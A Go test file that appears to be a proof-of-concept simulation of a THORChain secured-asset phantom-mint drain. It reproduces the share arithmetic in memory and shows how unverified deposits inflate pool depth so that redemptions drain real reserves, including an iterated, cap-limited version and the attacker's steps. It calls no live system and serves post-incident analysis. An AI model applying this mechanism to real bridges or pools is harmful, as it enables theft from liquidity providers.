// Standalone simulation of the THORChain 2026-05-15 Secured-Asset
// phantom-mint drain mechanism.
//
// Does NOT use thornode source — replicates the relevant logic
// (SecuredAssetMgr.Deposit / Withdraw, calcMintAmt, pool-depth accounting)
// faithfully enough to demonstrate that the bug class is exploitable
// when the three trust gates (Bifrost vault filter, observed-tx destination
// verification, SecuredAssetMgr vault check) are all open.
//
// Run with:
//
//	go test -v -run TestSecuredAssetPhantomMintDrain
//
// Compiles and runs on any platform with Go 1.21+. Reference for the
// vulnerable arithmetic: thornode @ 215cbad
// x/thorchain/manager_secured_asset_current.go:72-186.

package poc

import (
	"fmt"
	"testing"
)

// SecuredPool mirrors thornode's SecuredAsset struct fields used in Deposit/Withdraw.
type SecuredPool struct {
	Asset  string
	Depth  uint64 // tracked L1 backing (what thornode believes Asgard holds)
	Shares uint64 // total outstanding shares
}

// RealAsgard tracks what the L1 vault ACTUALLY holds, independent of thornode's view.
type RealAsgard struct {
	Asset   string
	Balance uint64
}

// calcMintAmt mirrors x/thorchain/manager_secured_asset_current.go:117-125.
func calcMintAmt(oldUnits, depth, add uint64) uint64 {
	if oldUnits == 0 || depth == 0 {
		return add
	}
	if add == 0 {
		return 0
	}
	// common.GetUncappedShare(add, depth, oldUnits) = (add * oldUnits) / depth
	return (add * oldUnits) / depth
}

// getSafeShare mirrors common.GetSafeShare(part, total, alloc) = (part * alloc) / total.
func getSafeShare(part, total, alloc uint64) uint64 {
	if total == 0 {
		return 0
	}
	return (part * alloc) / total
}

// DepositVulnerable replicates SecuredAssetMgr.Deposit at thornode 215cbad.
// THE BUG: no validation that `amount` was actually delivered to Asgard on L1.
// Reference: x/thorchain/manager_secured_asset_current.go:72-115.
func (p *SecuredPool) DepositVulnerable(
	owner string,
	balances map[string]uint64,
	amount uint64,
) (mintAmt uint64) {
	// === MISSING CHECKS (the entire bug) ===
	// 1. Did the L1 deposit actually land on an active Asgard vault?
	// 2. Is the source address (assetAddr) a real vault address?
	// 3. Was the inbound tx attested by ≥⅔ of active Bifrost observers?
	// All three are absent in thornode 215cbad.
	// =======================================

	mintAmt = calcMintAmt(p.Shares, p.Depth, amount)
	balances[owner] += mintAmt

	// THE PHANTOM LIQUIDITY: pool.Depth grows by the alleged deposit amount,
	// regardless of whether L1 actually moved.
	p.Depth += amount
	p.Shares += mintAmt
	return mintAmt
}

// Withdraw replicates SecuredAssetMgr.Withdraw.
// Reference: x/thorchain/manager_secured_asset_current.go:127-186.
// Returns the L1 amount the user receives (paid from RealAsgard).
func (p *SecuredPool) Withdraw(
	owner string,
	balances map[string]uint64,
	shareAmount uint64,
	asgard *RealAsgard,
) (payout uint64, ok bool) {
	shareBalance := balances[owner]
	assetAvailable := getSafeShare(shareBalance, p.Shares, p.Depth)
	burnAmt := getSafeShare(shareAmount, assetAvailable, shareBalance)
	if burnAmt == 0 {
		return 0, false
	}
	tokensToClaim := getSafeShare(burnAmt, shareBalance, assetAvailable)

	balances[owner] -= burnAmt
	p.Shares -= burnAmt
	p.Depth -= tokensToClaim

	// thornode schedules an outbound — TSS signs, real Asgard pays out.
	if asgard.Balance < tokensToClaim {
		// In real life: outbound would fail / partial. In the attack window,
		// pool reserves were sufficient for most calls (cap-limited).
		return 0, false
	}
	asgard.Balance -= tokensToClaim
	return tokensToClaim, true
}

// TestSecuredAssetPhantomMintDrain demonstrates the full attack on a
// simulated pool seeded with legitimate liquidity.
func TestSecuredAssetPhantomMintDrain(t *testing.T) {
	// === Initial state: legitimate users have deposited 10,000 XRUNE ===
	pool := &SecuredPool{Asset: "ETH.XRUNE", Depth: 10_000, Shares: 10_000}
	asgard := &RealAsgard{Asset: "ETH.XRUNE", Balance: 10_000}
	balances := map[string]uint64{}

	attacker := "thor19tq5gvcn7uvz0fayyy8cz48hy6773aphl5pxd6"

	t.Logf("INITIAL STATE")
	t.Logf("  pool.Depth (tracked) = %d", pool.Depth)
	t.Logf("  pool.Shares          = %d", pool.Shares)
	t.Logf("  asgard.Balance (L1)  = %d", asgard.Balance)
	t.Logf("  attacker shares      = %d", balances[attacker])

	// === Single attack iteration ===
	// Attacker sends Router.depositWithExpiry with vault=ATTACKER_OWN_ADDR.
	// Tokens self-transfer (no L1 movement to Asgard). Bifrost passes filter
	// (unknown vault → bypass instead of reject), event reaches thornode,
	// SecuredAssetMgr.Deposit runs without any vault check.
	attackerInputXRUNE := uint64(3_804)
	asgardL1Before := asgard.Balance
	minted := pool.DepositVulnerable(attacker, balances, attackerInputXRUNE)

	t.Logf("AFTER PHANTOM DEPOSIT (alleged %d XRUNE, no L1 movement)", attackerInputXRUNE)
	t.Logf("  pool.Depth (tracked) = %d  (inflated by %d)", pool.Depth, attackerInputXRUNE)
	t.Logf("  attacker shares      = %d  (minted: %d)", balances[attacker], minted)
	t.Logf("  asgard.Balance (L1)  = %d  (UNCHANGED)", asgard.Balance)
	if asgard.Balance != asgardL1Before {
		t.Fatalf("invariant broken: asgard L1 should be unchanged by phantom deposit")
	}

	// Now attacker submits MsgDeposit on THORChain with memo "SECURE-:0xAttackerEthAddr"
	// to redeem all shares. thornode schedules outbound from real Asgard.
	payout, ok := pool.Withdraw(attacker, balances, minted, asgard)
	if !ok {
		t.Fatal("withdraw failed — pool reserves insufficient (attack should require cap-limited iteration)")
	}

	t.Logf("AFTER WITHDRAW (attacker redeems shares)")
	t.Logf("  pool.Depth (tracked) = %d", pool.Depth)
	t.Logf("  attacker shares      = %d", balances[attacker])
	t.Logf("  asgard.Balance (L1)  = %d  (REAL DRAIN: -%d)", asgard.Balance, asgardL1Before-asgard.Balance)
	t.Logf("  attacker L1 receipt  = %d XRUNE", payout)

	// === Assertions ===
	if payout == 0 {
		t.Fatal("attack failed — withdraw produced no payout")
	}
	if asgard.Balance >= asgardL1Before {
		t.Fatal("attack failed — Asgard L1 not drained")
	}
	drained := asgardL1Before - asgard.Balance
	if drained != attackerInputXRUNE {
		t.Logf("note: drain (%d) ≠ alleged deposit (%d) — share ratio drift", drained, attackerInputXRUNE)
	}

	// Net P/L for attacker
	attackerNetGain := payout // attacker invested 0 (self-transfer)
	t.Logf("")
	t.Logf("=== ATTACK SUMMARY ===")
	t.Logf("  attacker invested:  0 XRUNE (self-transfer, no L1 movement to Asgard)")
	t.Logf("  attacker received:  %d XRUNE from real Asgard", payout)
	t.Logf("  attacker net gain:  %d XRUNE", attackerNetGain)
	t.Logf("  asgard.L1 lost:     %d XRUNE", drained)
	t.Logf("  ratio:              ∞ (free mint)")
}

// TestRepeatedAttackToCapLimit models the real-world per-call cap that
// forced ~150 iterations over 3 hours.
func TestRepeatedAttackToCapLimit(t *testing.T) {
	pool := &SecuredPool{Asset: "ETH.XRUNE", Depth: 10_000, Shares: 10_000}
	asgard := &RealAsgard{Asset: "ETH.XRUNE", Balance: 10_000}
	balances := map[string]uint64{}
	attacker := "thor19tq5gvcn7uvz0fayyy8cz48hy6773aphl5pxd6"

	// Per-call cap: 5% of current pool depth (conservative estimate).
	perCallCapPct := uint64(5)

	startL1 := asgard.Balance
	iterations := 0
	totalDrained := uint64(0)

	for iterations < 1000 && asgard.Balance > 100 {
		cap := (pool.Depth * perCallCapPct) / 100
		if cap == 0 {
			break
		}
		minted := pool.DepositVulnerable(attacker, balances, cap)
		payout, ok := pool.Withdraw(attacker, balances, minted, asgard)
		if !ok {
			break
		}
		totalDrained += payout
		iterations++
	}

	t.Logf("=== ITERATIVE DRAIN (cap=%d%% of pool per call) ===", perCallCapPct)
	t.Logf("  iterations:          %d", iterations)
	t.Logf("  asgard L1 before:    %d", startL1)
	t.Logf("  asgard L1 after:     %d", asgard.Balance)
	t.Logf("  total drained:       %d (%.1f%%)", totalDrained, 100*float64(totalDrained)/float64(startL1))
	t.Logf("  attacker net P/L:    +%d", totalDrained)

	if totalDrained == 0 {
		t.Fatal("iterative attack failed to drain anything")
	}
	if float64(totalDrained)/float64(startL1) < 0.5 {
		t.Errorf("expected to drain >50%% of pool, got %.1f%%", 100*float64(totalDrained)/float64(startL1))
	}

	// Sanity: matches observed real-world behavior (~80-85% drained before halt)
	fmt.Println()
	fmt.Println("Observed real-world (2026-05-15): ~80-85% of pool reserves drained")
	fmt.Println("across BTC/ETH/BSC/Base, halted at iteration ~150 by SamYap's manual detection.")
}
